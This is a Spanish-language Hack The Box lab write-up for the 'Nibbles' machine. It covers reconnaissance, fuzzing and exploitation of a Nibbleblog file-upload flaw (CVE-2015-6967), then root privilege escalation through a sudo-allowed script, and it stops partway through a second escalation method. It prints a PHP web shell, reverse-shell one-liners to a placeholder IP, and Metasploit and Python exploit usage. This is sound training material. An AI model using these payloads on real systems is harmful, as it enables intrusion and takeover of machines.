---
title: "Nibbles - Hack The Box"
date: 2023-04-19
draft: false
slug: "htb-writeup-nibbles"
excerpt: "Esta fue una máquina bastante sencilla, en la que vamos a analizar el código fuente de la página web que está activa en el servicio HTTP para poder entrar en una subpágina que utiliza el servicio Nibbleblog. Haremos Fuzzing normal y ambientado a subpáginas PHP y encontraremos algunas a las cuales podremos enumerar. Una vez dentro, analizaremos el Exploit CVE-2015-6967 que nos indicara que podemos añadir una Reverse Shell hecha en PHP, para poder conectarnos de manera remota. Ya conectados, utilizaremos un script en Bash con permisos de SUDO para poder escalar privilegios como Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Fuzzing", "Nibbleblog", "Information Leakage", "Arbitrary File Upload (AFU)", "CVE-2015-6967 (AFU)", "Reverse Shell", "Privesc - Abusing Sudoers Privileges", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "wget"
  - "nc"
  - "php"
  - "bash"
  - "metasploit framework(msfconsole)"
  - "Módulo: exploit/multi/http/nibbleblog_file_upload"
  - "git"
  - "python3"
  - "sudo"
  - "echo"
  - "chmod"
links:
  - "https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html"
  - "https://www.exploit-db.com/exploits/38489"
  - "https://www.tecmint.com/linux-server-health-monitoring-script/"
  - "https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d"
  - "https://github.com/dix0nym/CVE-2015-6967"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-nibbles/nibbles_logo.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL sabremos que SO opera en dicha máquina.
```bash
ping -c 4 10.10.10.75 
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=130 ms
64 bytes from 10.10.10.75: icmp_seq=2 ttl=63 time=136 ms
64 bytes from 10.10.10.75: icmp_seq=3 ttl=63 time=147 ms
64 bytes from 10.10.10.75: icmp_seq=4 ttl=63 time=153 ms

--- 10.10.10.75 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3014ms
rtt min/avg/max/mdev = 129.512/141.335/153.128/9.122 ms
```
Por el TTL, sabemos que la máquina usa Linux. Ahora, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.75 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:03 CST
Initiating SYN Stealth Scan at 13:03
Scanning 10.10.10.75 [65535 ports]
Discovered open port 80/tcp on 10.10.10.75
Discovered open port 22/tcp on 10.10.10.75
Completed SYN Stealth Scan at 13:04, 27.73s elapsed (65535 total ports)
Nmap scan report for 10.10.10.75
Host is up, received user-set (1.5s latency).
Scanned at 2023-04-19 13:03:33 CST for 27s
Not shown: 54242 filtered tcp ports (no-response), 11291 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.93 seconds
           Raw packets sent: 126522 (5.567MB) | Rcvd: 11429 (457.200KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo solamente dos puertos, que, pues ya conocemos. Cómo no tenemos las credenciales del SSH, tendremos que irnos a la página web del puerto HTTP, vamos a hacer el escaneo de servicios.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sC -sV -p22,80 10.10.10.75 -oN targeted                           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:08 CST
Nmap scan report for 10.10.10.75
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.96 seconds
```

 Parámetros | Descripción |

|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Bien, aparece el servicio **Apache**, pero mejor analicemos la página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos a la página web.

![](/assets/images/htb-writeup-nibbles/Captura1.png)

Pues no veo nada más que un mensaje, entonces veamos que nos dice el **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura2.png">
</p>

Veamos si la herramienta **whatweb** nos menciona algo más:
```bash
whatweb http://10.10.10.75
http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```

Lo mismo, veamos si podemos encontrar algo en el código fuente.

### Analizando Codigo Fuente de la Página Web {#Fuente}

Para entrar ahí, simplemente presiona **crtl + u**. 

Pues entremos:

![](/assets/images/htb-writeup-nibbles/Captura3.png)

Viene un mensaje que incluye el nombre de un directorio, vamos a entrar a ver si existe.

![](/assets/images/htb-writeup-nibbles/Captura4.png)

Aparece una página que supongo es hecha por default, pero viene el **servicio Nibbles** y lo que creo que es un usuario llamado **Yum Yum**, pero no estoy seguro, así que vamos a investigar este servicio:

| **Servicio Nibbleblog** |
|:-----------:|
| *Nibbleblog, un nuevo CMS para crear blogs sin usar base de datos [opensource] Diego Najar nos presenta nibbleblog.com, un nuevo proyecto de código libre que nos permite crear un blog y administrarlo de forma sencilla.* |

Entonces, se me hace que esta tiene sus propias subpáginas, solo por curiosidad veamos que nos dice **whatweb** sobre esta página:
```bash
whatweb http://10.10.10.75/nibbleblog
http://10.10.10.75/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75], RedirectLocation[http://10.10.10.75/nibbleblog/], Title[301 Moved Permanently]                                                                                                                                                                                                                                        
http://10.10.10.75/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```
Vemos que nos redirige hacia el directorio de **/nibbleblog/**, y lo más interesante es que la página usa **PHP** similar a **WordPress**, esto nos puede servir de ayuda más adelante, por ahora hagamos **Fuzzing**.

### Fuzzing y Enumeración Web {#Fuzz}

Solo por curiosidad, vamos a aplicar el **Fuzzing** a la página principal para ver si no hay algo más a parte del **directorio /nibbleblog**

Hagamos un **Fuzzing** rápido con **nmap**.

```bash
nmap --script http-enum -p80 10.10.10.75 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-19 13:17 CST
Nmap scan report for 10.10.10.75
Host is up (0.13s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.01 seconds
```

Achis, no saco nada, entonces vamos a usar **wfuzz** para ver si encuentra algo:
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/FUZZ/    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.75/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                              
=====================================================================

000000014:   200        16 L     9 W        93 Ch       "http://10.10.10.75//"                                               
000000083:   403        11 L     32 W       292 Ch      "icons"                                                              

Total time: 0
Processed Requests: 12748
Filtered Requests: 12733
Requests/sec.: 0
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 28: Operation timed out after 90070 milliseconds with 0 bytes received
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Nada de que nos pueda ayudar, ahora si enfoquemoslo al **directorio /nibbleblog**:

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.75/nibbleblog/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000259:   200        22 L     126 W      2127 Ch     "admin"                                                               
000000014:   200        60 L     168 W      2985 Ch     "http://10.10.10.75/nibbleblog//"                                     
000000519:   200        30 L     214 W      3777 Ch     "plugins"                                                             
000000075:   200        18 L     82 W       1353 Ch     "content"                                                             
000000127:   200        20 L     104 W      1741 Ch     "themes"                                                              
000000935:   200        27 L     181 W      3167 Ch     "languages"                                                           

Total time: 0
Processed Requests: 11551
Filtered Requests: 11532
Requests/sec.: 0

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 28: Operation timed out after 90000 milliseconds with 0 bytes received
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **Gobuster**:
```bash
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
Progress: 220463 / 220561 (99.96%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Hay algunos directorios que me llaman la atención, como la de **admin** y **content**, además supong que el **directorio README** nos dara información relevante del **servicio nibbleblog**.

Veamos primero de que se trata ese **README**:

<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura16.png">
</p>

Excelente, ya tenemos la versión de este servicio, siendo la **versión 4.0.3**. Esto nos será de utilidad más adelante.

Ahora, veamos el **directorio admin**:

![](/assets/images/htb-writeup-nibbles/Captura5.png)

Este directorio me parece que no debería ser público, pero después de enumerar su contenido, no encontre algo que nos pueda ayudar a ganar acceso a la máquina.

Pero, como ya vimos que el servicio usa **PHP** puede que existan subpáginas con la **extensión PHP**, veamos si es cierto usando **Gobuster**:
```bash
gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x php
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 301]
/index.php            (Status: 200) [Size: 2983]
/sitemap.php          (Status: 200) [Size: 401]
/content              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 322] [--> http://10.10.10.75/nibbleblog/themes/]
/feed.php             (Status: 200) [Size: 300]
/admin                (Status: 301) [Size: 321] [--> http://10.10.10.75/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.10.75/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/README               (Status: 200) [Size: 4628]
/languages            (Status: 301) [Size: 325] [--> http://10.10.10.75/nibbleblog/languages/]
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-x*	     | Para indicar que busque una extensión especifica. |

Excelente, ahora hay unas subpáginas que me llaman la atención como **admin.php**, veamos qué hay ahí:

![](/assets/images/htb-writeup-nibbles/Captura12.png)

Excelente, quizá sí buscamos en el **directorio content**, encontremos alguna credencial o algo de utilidad. 

Entonces, vámonos a **content**:

![](/assets/images/htb-writeup-nibbles/Captura6.png)

Muy bien, aquí si hay cosas que pueden interesarnos. 

Investigando cada directorio encontré el siguiente archivo:

<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura7.png">
</p>

Así que ya tenemos un usuario llamado **admin**, pero no tenemos contraseña. Para este punto sería bueno probar contraseñas comunes para el usuario admin, porque si buscas alguna credencial por defecto del **servicio nibbles**, te aparecerán muchas pistas sobre como resolver esta máquina y pues ahorita vamos desde cero, además de que al parecer este servicio no tiene contraseñas por default.

Quiza el nombre del servicio sea una pista, probemos distintas combinaciones:

![](/assets/images/htb-writeup-nibbles/Captura8.png)

Las contraseñas que use fueron:
* usuario: *admin*
* contraseña: *nibbles*

OJO, esto a lo mejor te puede funcionar en un ambiente real, no esta de más probarlo cuando puedas.

Ahora si, busquemos un Exploit, recuerda que ya tenemos la versión siendo esta la **4.0.3**.

## Explotación de Vulnerabilidades {#Explotacion}

### Buscando un Exploit {#Exploit}

En la búsqueda, encontré uno que nos puede servir.:
* <a href="https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html" target="_blank">NibbleBlog 4.0.3 Shell Upload</a>

Nos explica que podemos cargar un Payload de una **Reverse Shell** en un **archivo PHP** y nosotros ya conocemos uno, aunque es posible que si podemos ejecutar **archivos de PHP**, tengamos algunas formas de ganar acceso a la máquina.

#### Utilizando Reverse Shell de PentestMonkey {#Forma1}

Vamos a descargar y configurar la **Reverse Shell** de **PHP** de **pentestmonkey**.

Vámonos por pasos:

* Descarga el archivo:
```bash
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 5491 (5.4K) [text/plain]
Grabando a: «php-reverse-shell.php»
*
php-reverse-shell.php  100%[=================================================>]   5.36K  --.-KB/s    en 0s
*
(75.6 MB/s) - «php-reverse-shell.php» guardado [5491/5491]
```

* Cambia la IP y si quieres el puerto:
```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = 'Tu_IP';  // Pon tu IP
$port = 443;       // Si quieres cambia el puerto
$chunk_size = 1400;
```

* Una vez lo tengas configurado con tu IP y un puerto, vamos a alzar una **netcat**:
```bash
nc -nvlp 443   
listening on [any] 443 ...
```

* Ahora, vamos a subir el **archivo PHP** en la sección **My Image**:

![](/assets/images/htb-writeup-nibbles/Captura9.png)

* Cargamos la **Reverse Shell** y lo subimos:

![](/assets/images/htb-writeup-nibbles/Captura10.png)

Se subió, pero para que funcione debemos saber en que parte se subio para poder ejecutar el archivo. 

Por suerte, en el blog de esta vulnerabilidad, nos indica donde se esta guardando los archivos que carguemos, siendo en la siguiente ruta: `http://localhost/nibbleblog/content/private/plugins/my_image/`

Esto ya que el **plugin My Image** es el que es vulnerable y por lo que entiendo, los archivos que se suban ahí, tendran el nombre de **image.php**.

Vamos a esa ruta:

![](/assets/images/htb-writeup-nibbles/Captura11.png)

* Nuestro archivo se subió como **image.php**, solo dándole click, ya nos conecta en la **netcat**:
```bash
nc -nvlp 443   
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.75] 38648
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:05:10 up  3:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
$ cd /
```
De una vez, vamos a obtener una sesión interactiva, sigue estos pasos:

* Escribe el siguiente comando:
```bash
script /dev/null -c bash
```

* Presiona las teclas **ctrl + z**, debería aparecer el siguiente mensaje y luego la terminal de tu máquina:
```bash
zsh: suspended  nc -nvlp 443
```

* Ahora escribe el siguiente comando en tu máquina:
```bash
 stty raw -echo; fg       
[1]  + continued  nc -nvlp 443
```

* Escribe **reset** y te preguntará que tipo de terminal quieres, pon **xterm**:
```bash
[1]  + continued  nc -nvlp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

* Exportemos **xterm**, **bash** y cambiemos el tamaño de la terminal (este último es opcional, pero lo recomiendo):
```bash
nibbler@Nibbles:/$ export TERM=xterm
nibbler@Nibbles:/$ export SHELL=bash
nibbler@Nibbles:/$ stty rows 51 columns 189
```
Y listo, ya tenemos nuestra terminal interactiva.

* Ahora busquemos la flag:
```bash
nibbler@Nibbles:/$ whoami 
nibbler
nibbler@Nibbles:/$ cd /home
nibbler@Nibbles:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Dec 10  2017 .
drwxr-xr-x 23 root    root    4096 Dec 15  2020 ..
drwxr-xr-x  3 nibbler nibbler 4096 Dec 29  2017 nibbler
nibbler@Nibbles:/home$ cd nibbler/
nibbler@Nibbles:/home/nibbler$ ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Apr 19 18:09 user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
```

#### Utilizando CMD de PHP para Ganar Acceso a la Máquina {#Forma2}

Como ya vimos que podemos cargar **archivos PHP**, se me ocurrio que tal vez podamos agregar un archivo que funcione como una **CMD**, esto ya lo hemos hecho antes, así que probemos si funciona.

Vamos por pasos:

* Crea el siguiente **archivo PHP** que servira como una **CMD** en la web:
```php
<?php
	system($_GET['cmd']);
?>
```

* Guarda y carga el archivo, no importa el nombre que pongas, siempre se guardara como **image.php**:

<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura13.png">
</p>

* Entra y prueba el **comando whoami** dentro del parámetro **?cmd=** para ver si funciona

<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura14.png">
</p>

* Como ya vimos que funciono, alza una **netcat**:
```bash
nc -nvlp 443
```

* Y usa nuestra **Reverse Shell** favorita de **Bash** para conectarnos a la máquina, recuerda que debes usar la versión URL encodeada:
```bash
Versión normal: 
bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1
-
Version URL encodeada: 
bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261
```
<p align="center">
<img src="/assets/images/htb-writeup-nibbles/Captura15.png">
</p>

* Observa el resultado:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.75] 59182
bash: cannot set terminal process group (1341): Inappropriate ioctl for device
bash: no job control in this shell
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami                      
nibbler
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
```
Ya solamente falta hacer la terminal más interactiva, pero ya sabes como.

#### Probando Exploit: Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit) {#Forma3}

Resulta que ya existe una forma de subir archivos de forma automatizada con **Metasploit**, vamos a probar este exploit.

Vamos por pasos:
* Entra en **Metasploit Framework**:
```bash
msfconsole
```

* Busca el Exploit:

```bash
msf6 > search nibbleblog
Matching Modules
================
   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/nibbleblog_file_upload) >
```

* Configuralo con los parámetros necesarios:
```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > set RHOSTS 10.10.10.75
RHOSTS => 10.10.10.75
msf6 exploit(multi/http/nibbleblog_file_upload) > set USERNAME admin
USERNAME => admin
msf6 exploit(multi/http/nibbleblog_file_upload) > set PASSWORD nibbles
PASSWORD => nibbles
msf6 exploit(multi/http/nibbleblog_file_upload) > set TARGETURI /nibbleblog/
TARGETURI => /nibbleblog/
msf6 exploit(multi/http/nibbleblog_file_upload) > set LHOST Tu_IP
LHOST => Tu_IP
```

* Ejecuta el Exploit:
```bash
msf6 exploit(multi/http/nibbleblog_file_upload) > exploit
*
[*] Started reverse TCP handler on Tu_IP:4444 
[*] Sending stage (39927 bytes) to 10.10.10.75
[+] Deleted image.php
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.10.10.75:47988)
*
meterpreter > sysinfo
Computer    : Nibbles
OS          : Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: nibbler
```
Y listo, ya podemos continuar viendo la forma de escalar privilegios.

#### Probando Exploit de GitHub del CVE-2015-6967 {#Forma4}

Existe un Exploit de GitHub, que te automatiza la forma de subir los archivos y así poder acceder a la máquina. Lo único que necesitas es tener una **Reverse Shell** de **PHP** (como la de **pentestmonkey**) y usar el Exploit de GitHub que esta hecho en **Python** de este **GitHub**:
* <a href="https://github.com/dix0nym/CVE-2015-6967" target="_blank">Repositorio de dix0nym: CVE-2015-6967</a>

Lo malo es que ya viene con las credenciales para entrar, no esta mal, pero yo lo considero un poco tramposo porque ya te dieron un spoiler de como resolverla, pero lo puedes usar.

Vamos por pasos:

* Descarga el repo en tu máquina:
```bash
git clone https://github.com/dix0nym/CVE-2015-6967.git          
Clonando en 'CVE-2015-6967'...
remote: Enumerating objects: 7, done.
remote: Counting objects: 100% (7/7), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 7 (delta 0), reused 4 (delta 0), pack-reused 0
Recibiendo objetos: 100% (7/7), listo.
```

* Descarga y configura la **Reverse Shell** de **pentestmonkey**, aunque para este punto ya deberías tenerla lista.

* Una vez descargada y configurada, ponla en el mismo directorio en donde esté el Exploit. 

* Activa una **netcat**:
```bash
nc -nvlp 443   
listening on [any] 443 ...
```

* Ahora, usa el Exploit:
```bash
python3 exploit.py --url http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload php-reverse-shell.php 
[+] Login Successful.
[+] Upload likely successfull.
```

* Y ya estarás conectado:
```bash
nc -nvlp 443   
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.10.75] 38648
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 18:05:10 up  3:06,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
nibbler
```
Supongo que con este Exploit, podemos subir también nuestro **archivo CMD en PHP**, intenta probarlo.

## Post Explotación {#Post}

### Enumeración de Máquina Víctima

Hay 3 maneras para convertirnos en root. Pero para eso, necesitamos saber qué permisos tiene nuestro usuario:
```bash
nibbler@Nibbles:/home/nibbler$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Tenemos permisos para ejecutar el archivo **monitor.sh**. Si revisamos que archivos hay dentro del directorio del usuario Nibbles, veremos la flag, un archivo comprimido y los directorios en donde se encuentra el **archivo monitor.sh**.

Este archivo comprimido contiene el **archivo monitor.sh**.

### Escalando Privilegios de 3 Formas con Archivo .sh {#Privesc}

**IMPORTANTE**
Vamos a hacer las 2 primeras formas de escalar privilegios con lo que tenemos.

La tercera forma debe ser sin que se descomprima el archivo **personal.zip**, prueba la que quieras. 

--------

Bien, descomprime el archivo:
```bash
nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```

Una vez descomprimido, nos metemos a las carpetas hasta el script **monitor.sh**:
```bash
nibbler@Nibbles:/home/nibbler$ cd personal/stuff/
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```
Ahora sí, probemos las 2 formas con el archivo descomprimido. Pero antes, entra a ese archivo y borra o comenta el comando **clear** que está casi al principio.

#### Forma 1: Convertirse en Root con /bin/bash {#PostForma1}

Para esto, vamos a meter el siguiente comando en el script:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/bash -i" >> monitor.sh 
```
Después, ejecutamos el archivo con el comando **sudo**:
```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
root@Nibbles:/home/nibbler/personal/stuff#
```
Y ya somos **Root**, lo puedes comprobar, pero en el **PATH** lo dice:
```bash
root@Nibbles:/home/nibbler/personal/stuff# whoami
root
```

Esta forma, yo no la conocía, la encontré de aquí:
* <a href="https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d" target="_blank">Linux Privilege Escalation exploiting Sudo Rights — Part I</a>

#### Forma 2: Cambiar los Permisos de la Bash {#PostForma2}

Veamos los permisos de la **Bash**:
```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la /bin/bash
